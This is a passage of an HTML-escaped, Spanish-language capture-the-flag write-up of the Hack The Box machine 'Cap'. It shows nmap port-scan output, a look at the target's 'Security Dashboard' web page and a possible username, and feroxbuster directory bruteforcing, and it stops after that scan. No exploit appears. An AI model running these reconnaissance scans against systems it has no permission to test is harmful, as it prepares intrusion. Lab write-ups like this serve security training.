&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/52045&#34;&gt;InfoSecJack&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/52045&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[4.6, 3.5, 3.9, 6.1, 6.5],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[2, 2, 7, 3, 8],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos con nmap nos muestra multiples puertos abiertos: ftp (21), ssh (22), http (80).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.245 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.245&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.066s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;3072&lt;/span&gt; fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    gunicorn
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   FourOhFourRequest:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.0 &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; NOT FOUND
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Server: gunicorn
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Date: Sat, &lt;span class=&#34;m&#34;&gt;05&lt;/span&gt; Jun &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 19:32:49 GMT
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Connection: close
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;utf-8
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Length: &lt;span class=&#34;m&#34;&gt;232&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;!DOCTYPE HTML PUBLIC &lt;span class=&#34;s2&#34;&gt;&amp;#34;-//W3C//DTD HTML 3.2 Final//EN&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;p&amp;gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&amp;lt;/p&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   GetRequest:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.0 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Server: gunicorn
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Date: Sat, &lt;span class=&#34;m&#34;&gt;05&lt;/span&gt; Jun &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 19:32:43 GMT
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Connection: close
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;utf-8
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Length: &lt;span class=&#34;m&#34;&gt;19386&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;!DOCTYPE html&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;html &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;no-js&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;head&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;meta &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;meta http-equiv&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;x-ua-compatible&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;title&amp;gt;Security Dashboard&amp;lt;/title&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;meta &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;width=device-width, initial-scale=1&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;link &lt;span class=&#34;nv&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;shortcut icon&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;image/png&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/static/images/icon/favicon.ico&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;link &lt;span class=&#34;nv&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/static/css/bootstrap.min.css&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;link &lt;span class=&#34;nv&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/static/css/font-awesome.min.css&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;link &lt;span class=&#34;nv&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/static/css/themify-icons.css&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;link &lt;span class=&#34;nv&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/static/css/metisMenu.css&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;link &lt;span class=&#34;nv&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/static/css/owl.carousel.min.css&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;link &lt;span class=&#34;nv&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/static/css/slicknav.min.css&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;!-- amchar
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   HTTPOptions:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.0 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Server: gunicorn
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Date: Sat, &lt;span class=&#34;m&#34;&gt;05&lt;/span&gt; Jun &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 19:32:43 GMT
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Connection: close
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;utf-8
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Allow: HEAD, OPTIONS, GET
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Length: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   RTSPRequest:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.1 &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt; Bad Request
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Connection: close
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Type: text/html
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Length: &lt;span class=&#34;m&#34;&gt;196&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;html&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;head&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;title&amp;gt;Bad Request&amp;lt;/title&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;/head&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;body&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;h1&amp;gt;&amp;lt;p&amp;gt;Bad Request&amp;lt;/p&amp;gt;&amp;lt;/h1&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Invalid HTTP Version &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#x27;Invalid HTTP Version: &amp;amp;#x27;RTSP/1.0&amp;amp;#x27;&amp;amp;#x27;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;/body&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    &amp;lt;/html&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: gunicorn
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Security Dashboard
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;web-site&#34;&gt;Web Site&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina en el puerto 80 en donde se muestra un posible nombre de usuario &lt;code&gt;nathan&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/cap/Screenshot_20210605_132347.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Además se muestran distintas opciones.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/cap/Screenshot_20210605_132917.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Security Snapshot (5 Second PCAP + Analysis): el numero de paquetes de un archivo pcap capturados en 5 segundos, permite descargar del archivo.&lt;/li&gt;
&lt;li&gt;IP Config: muestra el resultado de ejecucion de &lt;code&gt;ifconfig&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Network Status: muestra los puertos y sockets de la maquina.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;directory-bruteforcing&#34;&gt;Directory Bruteforcing&lt;/h2&gt;
&lt;p&gt;Feroxbuster nos mostró las mismas direcciones que se muestran en la pagina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;π ~/htb/cap/www ❯ feroxbuster -u http://10.10.10.245 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /  &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;    /  &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;___ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_,    &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;___
by Ben &lt;span class=&#34;s2&#34;&gt;&amp;#34;epi&amp;#34;&lt;/span&gt; Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.245
 🚀  Threads               │ &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt;
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;200, 204, 301, 302, 307, 308, 401, 403, 405&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
 💥  Timeout &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;        │ &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ENTER&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; to use the Scan Cancel Menu™
──────────────────────────────────────────────────
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt;      355l     1055w    17454c http://10.10.10.245/ip
&lt;span class=&#34;m&#34;&gt;302&lt;/span&gt;        4l       24w      220c http://10.10.10.245/capture
&lt;span class=&#34;m&#34;&gt;302&lt;/span&gt;        4l       24w      208c http://10.10.10.245/data
